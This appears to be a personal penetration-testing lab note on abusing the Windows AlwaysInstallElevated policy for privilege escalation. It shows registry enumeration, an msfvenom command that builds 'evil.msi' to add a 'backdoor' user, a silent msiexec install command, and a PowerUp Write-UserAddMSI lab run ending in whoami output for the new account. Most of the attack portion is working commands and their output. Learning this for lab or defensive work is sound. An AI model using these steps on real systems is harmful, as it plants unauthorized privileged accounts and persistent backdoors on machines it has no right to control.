


# Overview

## Manual enumeration

```
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```

```
reg query HKCU\Software\Policies\Microsoft\Windows\Installer  
```

## automatic enumeration

```
[*] Checking for AlwaysInstallElevated registry key...

AbuseFunction : Write-UserAddMSI
```


so how do i abuse it? sadly using msfvenom


```
kali@kali ~> msfvenom -p windows/adduser USER=backdoor PASS=Backdoor123# -f msi-nouac -o evil.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 278 bytes
Final size of msi-nouac file: 159744 bytes
Saved as: evil.msi

```

launch it using

```
msiexec /quiet /qn /i C:\evil.msi
```


## Lab

```
PS C:\Users\user\Desktop\Tools\PowerUp> ls


    Directory: C:\Users\user\Desktop\Tools\PowerUp


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a---         5/30/2017   2:35 AM     562841 PowerUp.ps1


PS C:\Users\user\Desktop\Tools\PowerUp> . .\PowerUp.ps1
PS C:\Users\user\Desktop\Tools\PowerUp> Write-UserAddMSI

OutputPath
----------
UserAdd.msi


PS C:\Users\user\Desktop\Tools\PowerUp> ls


    Directory: C:\Users\user\Desktop\Tools\PowerUp


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a---         5/30/2017   2:35 AM     562841 PowerUp.ps1
-a---         7/21/2024   4:29 PM     208896 UserAdd.msi


PS C:\Users\user\Desktop\Tools\PowerUp> .\UserAdd.msi
PS C:\Users\user\Desktop\Tools\PowerUp>
```

![[Pasted image 20240721234817.png]]



```

C:\Users\backdoor>whoami /all

USER INFORMATION
----------------

User Name       SID
=============== ==============================================
tcm-pc\backdoor S-1-5-21-3825595215-1278258515-2096077417-1004


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes

====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                 Alias            S-1-5-32-544 Group usedfor deny only
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON  Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192  Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

C:\Users\backdoor>
```